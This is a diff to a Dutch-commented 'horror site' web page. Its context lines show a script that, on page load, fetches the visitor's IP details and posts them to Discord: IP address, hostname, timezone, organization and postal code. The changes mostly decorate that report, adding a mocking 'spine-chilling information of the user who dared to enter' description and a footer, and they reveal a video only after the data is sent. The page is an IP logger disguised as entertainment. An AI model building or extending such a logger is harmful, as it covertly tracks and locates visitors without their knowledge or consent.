@@ -94,11 +94,6 @@
         </video>
     </div>
 
-    <audio autoplay loop>
-        <source src="music.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-
     <script>
         // Roep de functie op wanneer de pagina wordt geladen
         window.onload = function() {
@@ -126,7 +121,9 @@
                 .then(data => {
                     const embedData = {
                         "embeds": [{
-                            "title": "IP Address Information",
+                            "title": "👻 IP Address Information",
+                            "description": "Here is the spine-chilling information of the user who dared to enter the horror site:",
+                            "color": 0xFF0000, // Rood kleurcode
                             "fields": [
                                 {"name": "IP Address", "value": data.ip},
                                 {"name": "Hostname", "value": data.hostname},
@@ -136,7 +133,10 @@
                                 {"name": "Timezone", "value": data.timezone},
                                 {"name": "Organization", "value": data.org},
                                 {"name": "Postal Code", "value": data.postal}
-                            ]
+                            ],
+                            "footer": {
+                                "text": "🔪 Horror Site - © 2024",
+                            }
                         }]
                     };
 
@@ -152,6 +152,9 @@
                     })
                     .then(response => console.log(response))
                     .catch(error => console.error('Error sending data to Discord:', error));
+
+                    // Laat video zien
+                    document.getElementById('video-container').style.display = 'block';
                 })
                 .catch(error => console.error('Error fetching IP data:', error));
             });
@@ -167,5 +170,11 @@
             });
         };
     </script>
+
+    <!-- Muziek -->
+    <audio autoplay loop>
+        <source src="music.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 </body>
 </html>
